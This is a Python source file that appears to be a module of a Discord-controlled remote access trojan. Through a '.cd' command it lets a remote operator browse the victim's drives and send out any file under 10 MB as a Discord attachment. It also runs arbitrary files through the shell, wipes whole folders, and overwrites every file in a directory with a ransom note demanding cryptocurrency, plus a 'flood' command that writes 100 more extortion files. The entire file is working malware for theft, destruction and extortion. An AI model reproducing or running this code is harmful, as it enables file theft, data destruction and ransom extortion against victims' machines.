import os, discord, subprocess, random, string, shutil
from co.config import CRYPTO_ADDRESS
current_directory = os.getcwd()

async def cd_command(ctx, *, args: str):
    global current_directory
    if args.startswith("steal "):
        file_path = args[len("steal "):].strip()
        if os.path.exists(file_path):
            if os.path.getsize(file_path) <= 10 * 1024 * 1024:
                await ctx.send(file=discord.File(file_path))
            else:
                await ctx.send("File size exceeds 10 MB, unable to send.")
        else:
            await ctx.send(f"File not found: {file_path}")
    elif args == "back":
        parent_directory = os.path.dirname(current_directory)
        if parent_directory != current_directory:
            current_directory = parent_directory
            os.chdir(current_directory)
            await ctx.send(f"Moved back to: {current_directory}")
        else:
            await ctx.send("Already at the root directory.")
    elif args == "help":
        help_message = (
            "Available commands:\n"
            ".cd <dirname> - Change to the specified directory.\n"
            ".cd back - Move back to the parent directory.\n"
            ".cd steal <file_path> - Steal the specified file and send as an attachment if under 10 MB.\n"
            ".cd list - List all files and folders in the current directory.\n"
            ".cd drive:<letter> - Switch to the specified drive.\n"
            ".cd hack - Renames all files to 'hackedbyutc.exe' and overwrites with specified content.\n"
            ".cd clearfolder - Deletes all files and subfolders in the current directory.\n"
            ".cd flood - Creates 100 files with repeated text content. \n"
            ".cd run <filepath> - Executes the specified file.\n"
            ".cd exopen <folderpath> - Opens a file explorer window set to said path\n"
            ".cd deletefile <file_path> - Delete the specified file.\n"
            ".cd makedir <dirname> - Create a new directory.\n"
            ".cd rmdir <dirname> - Remove the specified directory.\n"
        )
        await ctx.send(help_message)
    elif args.startswith("drive:"):
        drive = args.split(":")[1]
        if len(drive) == 1 and drive.isalpha():
            new_drive = f"{drive.upper()}:\\"
            if os.path.exists(new_drive):
                current_directory = new_drive
                os.chdir(current_directory)
                await ctx.send(f"Switched to drive: {new_drive}")
            else:
                await ctx.send(f"Drive not found: {new_drive}")
        else:
            await ctx.send("Drive not found. Use .cd drive:<letter>")
    elif args.startswith("run "):
        file_path = args[len("run "):].strip()
        if os.path.exists(file_path):
            try:
                subprocess.run(file_path, check=True, shell=True)
                await ctx.send(f"Executed file: {file_path}")
            except Exception as e:
                await ctx.send(f"Error running the file: {e}")
        else:
            await ctx.send(f"File not found: {file_path}")            
    elif args == "list":
        try:
            items = os.listdir(current_directory)
            with open("directory_list.txt", "w") as f:
                for item in items:
                    full_path = os.path.join(current_directory, item)
                    f.write(f"{full_path}\n")
            await ctx.send(file=discord.File("directory_list.txt"))
        except Exception as e:
            await ctx.send(f"Error listing items: {e}")
    elif args == "hack":
        try:
            for filename in os.listdir(current_directory):
                file_path = os.path.join(current_directory, filename)
                if os.path.isfile(file_path):
                    random_tag = ''.join(random.choices(string.ascii_letters + string.digits, k=3))
                    new_file_name = f"openinnotepad{random_tag}.fuckedfile"
                    new_file_path = os.path.join(current_directory, new_file_name)
                    os.rename(file_path, new_file_path)
                    with open(new_file_path, "w") as f:
                        f.write(f"YOURE FILES ARE LOCKED. PAY THIS CRYPTO ADDRESS: {CRYPTO_ADDRESS} IF YOU WANT THEM BACK!!!\n" * 5000)
            await ctx.send("Files corrupted successfully!")
        except Exception as e:
            await ctx.send(f"Error during hack: {e}")
    elif args.startswith("exopen "):
        dir_path = args[len("exopen "):].strip()
        if os.path.exists(dir_path) and os.path.isdir(dir_path):
            subprocess.run(f'explorer /select,"{dir_path}"', check=True)
            await ctx.send(f"File explorer opened for: {dir_path}")
        else:
            await ctx.send(f"Directory not found: {dir_path}")
    elif args == "clearfolder":
        try:
            for item in os.listdir(current_directory):
                item_path = os.path.join(current_directory, item)
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            await ctx.send("All contents incinerated.")
        except Exception as e:
            await ctx.send(f"Error clearing folder: {e}")
    elif args == "flood":
        try:
            for i in range(100):
                file_path = os.path.join(current_directory, f"utcthugs_{i}.ontop")
                with open(file_path, "w") as f:
                    f.write(f"Pay 50 USD in LTC to {CRYPTO_ADDRESS} or your files and data are gone!!!\n" * 500)
            await ctx.send("Flooded the dir with files.")
        except Exception as e:
            await ctx.send(f"Error during flood: {e}")
    elif args.startswith("deletefile "):
        file_path = args[len("deletefile "):].strip()
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
                await ctx.send(f"File deleted: {file_path}")
            except Exception as e:
                await ctx.send(f"Error deleting file: {e}")
        else:
            await ctx.send(f"File not found: {file_path}")
    elif args.startswith("makedir "):
        dir_name = args[len("makedir "):].strip()
        new_dir_path = os.path.join(current_directory, dir_name)
        if not os.path.exists(new_dir_path):
            os.mkdir(new_dir_path)
            await ctx.send(f"Directory created: {new_dir_path}")
        else:
            await ctx.send(f"Directory already exists: {new_dir_path}")
    elif args.startswith("rmdir "):
        dir_name = args[len("rmdir "):].strip()
        dir_path = os.path.join(current_directory, dir_name)
        if os.path.isdir(dir_path):
            try:
                shutil.rmtree(dir_path)
                await ctx.send(f"Directory removed: {dir_path}")
            except Exception as e:
                await ctx.send(f"Error removing directory: {e}")
        else:
            await ctx.send(f"Directory not found: {dir_path}")
    else:
        new_path = os.path.join(current_directory, args)
        if os.path.isdir(new_path):
            current_directory = new_path
            os.chdir(current_directory)
            await ctx.send(f"Changed directory to: {current_directory}")
        else:
            await ctx.send(f"Not a directory: {args}")